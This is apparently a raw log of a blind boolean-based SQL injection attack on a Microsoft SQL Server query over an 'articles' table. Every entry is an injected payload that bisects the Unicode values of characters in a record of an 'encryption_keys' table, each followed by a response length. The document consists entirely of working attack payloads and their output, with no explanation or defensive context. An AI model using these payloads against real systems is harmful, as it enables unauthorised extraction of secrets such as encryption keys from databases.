+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>99	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>100	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>101	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>104	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>100	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>98	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),23,1))>99	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>104	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>100	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>98	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),24,1))>99	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>96	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>48	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>72	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>60	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>54	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),25,1))>55	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>87	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>107	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>97	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>102	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>99	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),26,1))>98	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>104	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>100	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>98	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),27,1))>97	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>104	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>100	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>98	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),28,1))>97	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>96	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>48	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>72	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>60	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>54	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>51	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),29,1))>49	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),30,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),30,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),30,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),30,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),30,1))>52	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),30,1))>54	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),30,1))>55	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),30,1))>56	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),31,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),31,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),31,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),31,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),31,1))>52	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),31,1))>49	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),31,1))>50	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),32,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),32,1))>87	409
+	200
+use [master]	86
+	165
